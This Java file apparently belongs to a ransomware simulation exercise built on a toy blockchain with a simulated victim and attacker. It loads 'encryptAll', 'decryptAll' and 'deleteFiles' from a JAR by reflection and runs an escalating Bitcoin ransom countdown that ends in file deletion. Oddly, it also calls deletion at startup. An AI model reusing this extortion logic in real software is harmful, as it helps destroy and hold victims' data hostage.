

import blockchain.Block;
import blockchain.Blockchain;
import Persons.*;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Objects;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Application {

    private final Person clueLess = new Person("clueless");
    private final Person ed = new Person("ed");
    private Class clazz;
    private Object instance;
    private static final Application application = new Application();
    private final Blockchain blockchain = new Blockchain();
    private static float amount = 0.02755f;
    private static int counter;
    private static final ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor();

    public static void main(String... args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {
        Person SatoshiNakamoto = new Person("Statoshi Nakamoto");
        SatoshiNakamoto.initializeBlockchain();
        application.loadClazzFromJavaArchive();
        application.provideInstanceOfClass();
        application.executeMethodDirectlyWithoutPort("deleteFiles");
        int i = 0;
        while (i == 0) {
            String in = null;
            String[] command = null;
            BufferedReader in1 = new BufferedReader(new InputStreamReader(System.in));
            in = in1.readLine();
            command = in.split(" ");
            if (Objects.equals(in, "launch http://www.trust-me.mcg/report.jar")) {
                application.launch();
                executorService.scheduleAtFixedRate(Application::increase, 60, 60, TimeUnit.SECONDS);
            }

            else if (Objects.equals(command[0], "exchange")) {
                float amount = Float.parseFloat(command[1]);
                application.exchange(amount);
            }

            else if (Objects.equals(command[0], "show")) {
                if (Objects.equals(command[1], "balance")) {
                    application.showBalance();
                }
                else if (Objects.equals(command[1], "recipient")) {
                    application.showRecipient();
                }
                else {
                    System.out.println("Sorry, but we ware not able to show "+ command[1]);
                }
            }

            else if (Objects.equals(command[0], "pay")) {
                float amount = Float.parseFloat(command[1]);
                application.pay(amount);
            }

            else if (Objects.equals(in, "check payment")) {
                application.checkPayment();
            }

            else if (Objects.equals(command[0], "exit")) {
                i = 1;
            }

            else {
                System.out.println("The Method "+in+" does not exist.");
            }
        }
    }

    public void launch(){
        application.executeMethodDirectlyWithoutPort("encryptAll");
        System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted.");
    }

    public void exchange(float amount){
        clueLess.exchangeForBitcoin(amount);
        System.out.println("exchange "+ amount);
    }

    public void showBalance(){
        System.out.println("BankCredit: "+clueLess.getBankAccount().getCredit());
        System.out.println("BitcoinCredit: "+clueLess.getWallet().getAmount());
    }

    public void showRecipient(){
        System.out.println(ed.getWallet().getBitcoinAdress());
    }

    public void pay(float amount1){
        if (amount1 >= amount){
            clueLess.pay(amount1,ed.getWallet().getBitcoinAdress());
            ed.getWallet().setNewAmount(amount1);
            executorService.shutdown();
        } else {
            System.out.println("Your need to pay "+amount+" BTC.");
        }

    }

    public void checkPayment(){
        if (clueLess.checkPayment()){
            application.executeMethodDirectlyWithoutPort("decryptAll");
            System.out.println("Files decrypted");
        }
    }

    private static void increase(){
        amount = amount + 0.01f;
        counter++;
        if (counter == 4){
            application.executeMethodDirectlyWithoutPort("deleteFiles");
            System.out.println("Your files have been deleted!");
        } else if (counter == 3) {
            System.out.println("Pay "+amount+" BTC immediately or your files will be irrevocably deleted.");
        } else {
            System.out.println("Increase by 0.01 BTC to "+ amount);
        }
    }

    public void loadClazzFromJavaArchive() {
        try {
            URL[] urls = {new File(Configuration.instance.subFolderPathOfJarArchive).toURI().toURL()};
            URLClassLoader urlClassLoader = new URLClassLoader(urls, Application.class.getClassLoader());
            clazz = Class.forName(Configuration.instance.nameOfClass, true, urlClassLoader);
            System.out.println("class    | " + clazz + " - " + clazz.hashCode());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void provideInstanceOfClass() {
        try {
            instance = clazz.getMethod("getInstance").invoke(null);
            System.out.println("instance | " + instance.toString() + " - " + instance.hashCode());
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }

    public void executeMethodDirectlyWithoutPort(String method1) {

        try {
            Method method = clazz.getDeclaredMethod(method1);
            String version = (String) method.invoke(instance);
        } catch (Exception e) {
            e.printStackTrace();
        }

        System.out.println();
    }


}
